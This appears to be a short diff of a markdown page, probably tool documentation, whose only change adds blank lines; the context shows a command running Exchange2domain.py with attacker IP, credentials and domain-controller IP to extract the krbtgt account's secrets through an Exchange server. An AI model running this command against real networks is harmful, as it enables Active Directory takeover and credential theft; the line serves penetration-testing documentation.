@@ -16,3 +16,5 @@ updated_at: '2023-04-10T20:26:32.381858+00:00'
 ```bash
 python Exchange2domain.py -ah [attacker IP] -u [username] -p [password] -d [domain] -th [DC IP] --just-dc-user krbtgt [Mail Server IP]
 ```
+
+
